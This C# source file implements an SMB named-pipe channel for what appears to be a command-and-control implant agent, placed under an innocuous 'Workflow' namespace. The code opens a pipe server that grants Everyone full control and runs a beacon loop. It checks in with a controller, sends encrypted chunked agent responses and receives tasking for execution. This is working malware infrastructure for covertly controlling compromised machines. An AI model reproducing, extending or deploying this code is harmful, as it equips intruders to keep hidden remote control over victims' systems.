using Workflow.Contracts;
using Workflow.Utilities;
using System.Text.Json;
using Workflow.Models;
using Workflow.Channels.Smb;
using System.Collections.Concurrent;
using System.Text;
using System.IO.Pipes;
using System.Security.AccessControl;
using System.Security.Principal;
using H.Pipes;
using H.Pipes.AccessControl;
using H.Pipes.Args;

namespace Workflow.Channels
{
    public class SmbProfile : IChannel
    {
        private IServiceConfig agentConfig { get; set; }
        private ISecurityProvider crypt { get; set; }
        private IDataBroker messageManager { get; set; }
        private ILogger logger { get; set; }
        private string pipeName;
        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
        private PipeServer<SmbMessage> serverPipe { get; set; }
        private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
        private ManualResetEvent onClientConnectedSignal = new ManualResetEvent(false);
        public event EventHandler<TaskingReceivedArgs> SetTaskingReceived;
        public event EventHandler<MessageReceivedArgs> SetMessageReceived;
        private CheckinResponse cir;

        private bool checkedin = false;
        private bool connected = false;
        private int currentAttempt = 0;
        private int maxAttempts = 10;
        private CancellationTokenSource cancellationTokenSource { get; set; } = new CancellationTokenSource();
        public SmbProfile(IServiceConfig config, ISecurityProvider crypto, ILogger logger, IDataBroker messageManager)
        {
            this.agentConfig = config;
            this.crypt = crypto;
            this.logger = logger;
            this.messageManager = messageManager;

            var opts = JsonSerializer.Deserialize(
                ChannelConfig.Decode(),
                SmbChannelOptionsJsonContext.Default.SmbChannelOptions);

            this.pipeName = opts.PipeName;
            DebugLog.Log($"SMB pipe name: {this.pipeName}");

            this.serverPipe = new PipeServer<SmbMessage>(this.pipeName);
            if (OperatingSystem.IsWindows())
            {
#pragma warning disable CA1416
                var pipeSec = new PipeSecurity();
                pipeSec.AddAccessRule(new PipeAccessRule(new SecurityIdentifier(WellKnownSidType.WorldSid, null), PipeAccessRights.FullControl, AccessControlType.Allow));
                this.serverPipe.SetPipeSecurity(pipeSec);
#pragma warning restore CA1416
            }

            this.serverPipe.ClientConnected += async (o, args) => await OnClientConnection();
            this.serverPipe.ClientDisconnected += async (o, args) => await OnClientDisconnect();
            this.serverPipe.MessageReceived += async (sender, args) => await OnMessageReceive(args);
            this.serverPipe.StartAsync(this.cancellationTokenSource.Token);
            DebugLog.Log("SMB server pipe started");
        }

        public async Task<CheckinResponse> Checkin(Checkin checkin)
        {
            //Write our checkin message to the pipe
            DebugLog.Log("SMB sending checkin");
            await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin));

            //Wait for a checkin response message
            DebugLog.Log("SMB waiting for checkin response");
            checkinAvailable.Wait();

            //We got a checkin response, so let's finish the checkin process
            this.checkedin = true;
            DebugLog.Log("SMB checkin complete");
            return this.cir;
        }

        public async Task StartBeacon()
        {
            //Main beacon loop handled here
            this.cancellationTokenSource = new CancellationTokenSource();
            while (!cancellationTokenSource.Token.IsCancellationRequested)
            {
                //Check if we have something to send.
                if (!this.messageManager.HasResponses())
                {
                    continue;
                }

                try
                {
                    DebugLog.Log("SMB beacon sending responses");
                    await this.Send(messageManager.GetAgentResponseString());
                }
                catch (Exception e)
                {
                    this.currentAttempt++;
                    DebugLog.Log($"SMB beacon send failed, attempt {this.currentAttempt}/{this.maxAttempts}");
                }

                if (this.currentAttempt >= this.maxAttempts)
                {
                    DebugLog.Log("SMB beacon max attempts reached, cancelling");
                    this.cancellationTokenSource.Cancel();
                }
            }
        }
        internal async Task<string> Send(string json)
        {
            if (!connected)
            {
                DebugLog.Log("SMB Send waiting for client connection");
                onClientConnectedSignal.WaitOne();
            }

            DebugLog.Log($"SMB Send ({json.Length} bytes before encryption)");
            try
            {
                json = this.crypt.Encrypt(json);
                SmbMessage sm = new SmbMessage()
                {
                    guid = Guid.NewGuid().ToString(),
                    final = false,
                    message_type = "chunked_message",
                    agent_guid = agentConfig.uuid,
                };

                IEnumerable<string> parts = json.SplitByLength(4000);
                DebugLog.Log($"SMB Send chunking into {parts.Count()} parts");

                foreach (string part in parts)
                {
                    sm.delegate_message = part;

                    if (part == parts.Last())
                    {
                        sm.final = true;
                    }
                    await this.serverPipe.WriteAsync(sm);
                }

            }
            catch (Exception e)
            {
                this.connected = false;
            }

            return String.Empty;
        }

        public bool StopBeacon()
        {
            this.cancellationTokenSource.Cancel();
            return true;
        }

        private async Task SendSuccess()
        {
            //Indicate the server that we're done processing the message and it can send the next one (if it's there)
            SmbMessage sm = new SmbMessage()
            {
                guid = Guid.NewGuid().ToString(),
                message_type = "success",
                final = true,
                delegate_message = String.Empty,
                agent_guid = agentConfig.uuid,
            };

            await this.serverPipe.WriteAsync(sm);
        }

        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
        {
            //Event handler for new messages
            try
            {
                DebugLog.Log($"SMB message received, type: {args.Message.message_type}");
                if (args.Message.message_type == "success")
                {
                    return;
                }

                this.partialMessages.TryAdd(args.Message.guid, new StringBuilder()); //Either Add the key or it already exists

                this.partialMessages[args.Message.guid].Append(args.Message.delegate_message);
                DebugLog.Log($"SMB partial message tracked for {args.Message.guid}, final: {args.Message.final}");

                if (args.Message.final)
                {
                    DebugLog.Log("SMB message complete, processing");
                    this.OnMessageReceiveComplete(this.partialMessages[args.Message.guid].ToString());
                    this.partialMessages.TryRemove(args.Message.guid, out _);
                }

                await this.SendSuccess();
            }
            catch (Exception e)
            {
            }
        }

        private async Task OnClientConnection()
        {
            DebugLog.Log("SMB client connected");
            onClientConnectedSignal.Set();
            this.connected = true;
            await this.SendUpdate();
        }

        private async Task OnClientDisconnect()
        {
            DebugLog.Log("SMB client disconnected");
            this.connected = false;
            onClientConnectedSignal.Reset();
            this.partialMessages.Clear();
        }

        private async void OnMessageReceiveComplete(string message)
        {
            //If we haven't checked in yet, the only message this can really be is a checkin.
            if (!checkedin)
            {
                cir = JsonSerializer.Deserialize(this.crypt.Decrypt(message), CheckinResponseJsonContext.Default.CheckinResponse);
                checkinAvailable.Set();
                return;
            }

            //If we make it to here, it's a tasking response
            GetTaskingResponse gtr = JsonSerializer.Deserialize(this.crypt.Decrypt(message), GetTaskingResponseJsonContext.Default.GetTaskingResponse);
            if (gtr == null)
            {
                return;
            }
            TaskingReceivedArgs tra = new TaskingReceivedArgs(gtr);
            this.SetTaskingReceived(this, tra);
            //test
        }
        private async Task SendUpdate()
        {
            SmbMessage sm = new SmbMessage()
            {
                guid = Guid.NewGuid().ToString(),
                final = true,
                message_type = "success",
                delegate_message = "",
                agent_guid = this.agentConfig.uuid
            };

            await this.serverPipe.WriteAsync(sm);
        }
    }
}
